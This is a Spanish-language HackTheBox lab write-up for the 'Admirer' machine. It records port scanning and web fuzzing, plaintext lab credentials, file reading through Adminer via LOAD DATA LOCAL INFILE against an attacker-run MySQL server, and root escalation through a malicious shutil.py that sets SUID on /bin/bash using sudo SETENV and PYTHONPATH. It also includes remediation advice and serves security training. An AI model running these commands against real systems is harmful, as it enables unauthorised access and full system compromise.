---
title: "HTB - Admirer"
platform: "[[HackTheBox]]"
os: "Linux"
tags:
  - Linux
  - Web-Enumeration
  - Fuzzing
  - Credential-Discovery
  - MySQL
  - Adminer
  - PATH-Hijacking
  - Python-Library-Hijacking
  - Privilege-Escalation
hashtags:
  - "#Admirer"
  - "#LinuxPrivilegeEscalation"
  - "#PathHijacking"
  - "#PythonHijacking"
  - "#HTB"
image:
  path: /assets/images/posts/htb/admirer/admirer-banner.png
  alt: "HTB Admirer Banner"
toc: true
toc_label: "📑 Contenido"
toc_sticky: true

---

# HTB - Admirer

## 📊 Resumen Ejecutivo

Se realizó un compromiso exitoso contra la máquina **Admirer** de HackTheBox, un sistema **Linux** que expone los servicios **FTP (21)**, **SSH (22)** y **HTTP (80)**.

El vector de entrada fue la enumeración web que reveló un archivo `robots.txt` con una ruta `/admin-dir`. El fuzzing de este directorio expuso archivos `contacts.txt` y `credentials.txt` con credenciales en texto plano para cuentas de correo interno, FTP y WordPress.

Con las credenciales de FTP se descargaron archivos que permitieron continuar la enumeración. Posteriormente, se descubrió una instancia de **Adminer** (cliente MySQL web) en `/utility-scripts/adminer.php`, que fue explotada para leer archivos del sistema mediante `LOAD DATA LOCAL INFILE`, obteniendo credenciales de la base de datos y del usuario `waldo`.

El acceso SSH con las credenciales de `waldo` permitió ingresar al sistema. La escalada de privilegios se logró mediante **path hijacking** de una librería de Python (`shutil`) aprovechando que el script `/opt/scripts/admin_tasks.sh` se ejecutaba con `SETENV` y buscaba módulos en el directorio actual.

### 🚨 Riesgos Identificados

| Riesgo | Impacto | Probabilidad | Severidad |
|--------|---------|--------------|-----------|
| `robots.txt` exponiendo rutas sensibles | Medio | Confirmado | 🟠 MEDIO |
| Archivos `.txt` con credenciales en texto plano | Crítico | Confirmado | 🔴 CRÍTICO |
| Adminer expuesto sin autenticación | Alto | Confirmado | 🟠 ALTO |
| MySQL con `LOAD DATA LOCAL INFILE` habilitado | Alto | Confirmado | 🟠 ALTO |
| Script Python ejecutándose con `SETENV` sin ruta absoluta | Crítico | Confirmado | 🔴 CRÍTICO |

### ✅ Plan de Remediación

1. **Inmediato:** Eliminar archivos `credentials.txt` y `contacts.txt` del servidor web.
2. **Inmediato:** Rotar todas las contraseñas expuestas (FTP, MySQL, WordPress, usuario `waldo`).
3. **Corto plazo:** Restringir acceso a `adminer.php` por IP o eliminar si no es necesario.
4. **Mediano plazo:** Deshabilitar `LOAD DATA LOCAL INFILE` en MySQL si no se requiere.
5. **Largo plazo:** Revisar scripts con privilegios; usar rutas absolutas para módulos Python.

---

## 🖼️ Machine Info

| Clave | Valor |
|-------|-------|
| **Nombre** | Admirer |
| **IP** | `10.129.229.101` |
| **OS** | Linux (Debian 10+deb9u7) |
| **Dominio** | `admirer.htb` (inferido por correos) |
| **Skills** | Web Enum, Fuzzing, Credential Discovery, MySQL Injection/Reading, PATH/Python Hijacking |
| **Fecha** | 2026-05-11 |

---

## 🔍 Reconocimiento (Reconnaissance)

### 🎯 Target Scoping

- **IP Objetivo:** `10.129.229.101`
- **Hostname Detectado:** `admirer` (por el título de la web)
- **Sistema:** Debian 10+deb9u7

### 📡 Escaneo de Puertos

#### Escaneo Inicial (Full Port Scan)

```bash
# Escaneo rápido de todos los puertos TCP
sudo nmap -p- --open -sS --min-rate=2000 -n -Pn -v $target -oN allServices

cat allPorts | awk '{print $1}' FS="/" | grep "^[0-9]" | tr '\n' ','
```

**Resultado del escaneo:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Escaneo detallado de servicios

```bash
nmap -p21,22,80 -sCV -v -Pn $target -oN detailedServices
```

### 📊 Servicios Identificados

| Puerto | Servicio | Versión | Notas |
|--------|----------|---------|-------|
| 21/tcp | FTP | vsftpd 3.0.3 | Posible acceso anónimo o con credenciales |
| 22/tcp | SSH | OpenSSH 7.4p1 | Posible acceso si se obtienen credenciales |
| 80/tcp | HTTP | Apache 2.4.25 | Título "Admirer", robots.txt con /admin-dir |

> **Observación:** El archivo `robots.txt` revela la ruta `/admin-dir`, lo que amplía la superficie de ataque.

---

## 📁 Enumeración de subdirectorios (Fuzzing)

### Fuzzing inicial

Se realizó fuzzing sobre la ruta `/admin-dir` revelada por `robots.txt`:

```bash
# Gobuster con extensiones txt y php
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,php -u http://10.129.229.101/admin-dir -t 50

# Ffuf para directorios dentro de /admin-dir
ffuf -u http://10.129.229.101/admin-dir/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -fc 404

# Ffuf para directorios en la raíz
ffuf -u http://10.129.229.101/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -fc 404
```

#### Recursos críticos encontrados

```bash
contacts.txt         (Status: 200) [Size: 350]
credentials.txt      (Status: 200) [Size: 136]
```

### Credenciales expuestas

**credentials.txt** contenido:

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

**contacts.txt** contenido:

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

> **Conclusión:** Se obtuvieron credenciales para FTP, WordPress y un usuario de correo. El dominio `admirer.htb` se infiere de los correos electrónicos.

---

## 📡 Enumeración FTP

Con las credenciales obtenidas (`ftpuser:%n?4Wz}R$tTF7`), se accedió al servicio FTP:

```bash
ftp 'ftpuser'@10.129.229.101
# Password: %n?4Wz}R$tTF7

ftp> dir
ftp> get all
```

Se descargaron archivos del servidor FTP para su análisis posterior.

---

## 🔄 Enumeración adicional con fuzzing

Se realizó un nuevo fuzzing excluyendo códigos de estado 403 y 404 para descubrir rutas ocultas:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x txt,php -u http://$target/admin-dir -t 50 --exclude-length 403,404
```

**Recurso crítico encontrado:**

```
http://10.129.229.101/utility-scripts/adminer.php
```

**Adminer** es un cliente MySQL web (similar a phpMyAdmin). Su exposición sin autenticación permite conectarse a bases de datos.

---

## 🗄️ Explotación de Adminer + MySQL

### Configuración de MySQL en el atacante

Para explotar Adminer, se necesita un servidor MySQL accesible desde la víctima. Se configuró MariaDB en la máquina atacante:

```bash
# Iniciar MariaDB
sudo systemctl start mariadb
sudo mysql -uroot

# Ver bases de datos existentes
SHOW DATABASES;

# Crear base de datos para la máquina Admirer
CREATE DATABASE admirer_db;

# Crear usuario con acceso desde la IP de la víctima
CREATE USER 'nyx'@'10.129.229.101' IDENTIFIED BY 'nyx123';

# Dar privilegios
GRANT ALL PRIVILEGES ON admirer_db.* TO 'nyx'@'10.129.229.101';

# Aplicar cambios
FLUSH PRIVILEGES;

# Salir
EXIT;
```

### Configurar MySQL para escuchar en todas las interfaces

Editar el archivo de configuración:

```bash
sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf

# Cambiar bind-address a:
bind-address = 0.0.0.0

# Reiniciar servicio
sudo systemctl restart mariadb
```

### Conexión desde Adminer

Desde `http://10.129.229.101/utility-scripts/adminer.php`:
- **Servidor:** IP de la máquina atacante
- **Usuario:** nyx
- **Contraseña:** nyx123
- **Base de datos:** admirer_db

### Lectura de archivos del sistema

Una vez conectado, se utilizó `LOAD DATA LOCAL INFILE` para leer archivos del servidor web:

```sql
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE demo FIELDS TERMINATED BY "\n";
```

**Credenciales obtenidas del archivo:**

```php
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

> **Contraseña del usuario `waldo`:** `&<h5b~yK3F#{PaPB&dA}{H>`

---

## 🚪 Acceso al sistema

Las credenciales obtenidas funcionaron para acceso SSH:

```bash
ssh waldo@10.129.229.101
Password: &<h5b~yK3F#{PaPB&dA}{H>
```

Una vez dentro, se enumeraron privilegios del usuario:

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

> **Observación:** El usuario `waldo` puede ejecutar `/opt/scripts/admin_tasks.sh` con **SETENV**, lo que permite modificar variables de entorno antes de ejecutar el script.

---

## 📈 Escalada de privilegios

### Análisis del script

```bash
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
# (contenido del script)

waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

El script `admin_tasks.sh` ejecuta `backup.py`, que importa la librería `shutil`.

### Vulnerabilidad: Path Hijacking de Python

Python busca módulos en el directorio actual **antes** que en las rutas del sistema. Si se puede crear un `shutil.py` malicioso en un directorio controlado por `waldo`, y luego modificar `PYTHONPATH` para que apunte a ese directorio, se puede ejecutar código arbitrario con los privilegios del script (que se ejecuta con sudo).

### Explotación

```bash
# Crear directorio temporal
cd /tmp

# Crear shutil.py malicioso
nano shutil.py
```

Contenido de `shutil.py`:

```python
import os
os.system("chmod u+s /bin/bash")
```

```bash
# Ejecutar el script con PYTHONPATH apuntando a /tmp
sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
```
![Root](/assets/img/posts/htb/admirer/20260513155605.png)


### Verificación de escalada

```bash
# Verificar que /bin/bash tiene SUID
ls -la /bin/bash

# Ejecutar bash con privilegios
/bin/bash -p

# Confirmar usuario
whoami
# root
```

---

## Flags

```bash
# User flag
waldo@admirer:~$ cat /home/waldo/user.txt
[Bloqueado]

# Root flag
root@admirer:~# cat /root/root.txt
[Bloqueado]
```

---

## 🛠️ Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Escaneo de puertos y servicios |
| `gobuster` | Fuzzing de directorios web |
| `ffuf` | Fuzzing de directorios web |
| `ftp` | Conexión al servicio FTP |
| `Adminer` | Cliente MySQL web |
| `MySQL/MariaDB` | Servidor de base de datos del atacante |
| `ssh` | Acceso remoto al sistema |
| `Python` | Path hijacking para escalada |

---

## 📚 Referencias

- [HackTheBox - Admirer](https://www.hackthebox.com/machines/Admirer)
- [Adminer - LOAD DATA LOCAL INFILE exploitation](https://www.exploit-db.com/exploits/50457)
- [Python Path Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/python-library-hijacking)

---

## 💡 Lecciones aprendidas

1. **`robots.txt` no debe contener rutas sensibles** → un atacante las usará como punto de partida.
2. **Nunca guardar credenciales en archivos de texto dentro del servidor web** → son fácilmente enumerables.
3. **Adminer/phpMyAdmin expuestos sin autenticación son una puerta abierta** → restringir por IP o eliminar.
4. **El privilegio `SETENV` en sudo es peligroso** → permite modificar `PYTHONPATH`, `PATH`, `LD_PRELOAD`, etc.
5. **Los scripts que ejecutan código Python con privilegios deben usar rutas absolutas** para evitar hijacking de librerías.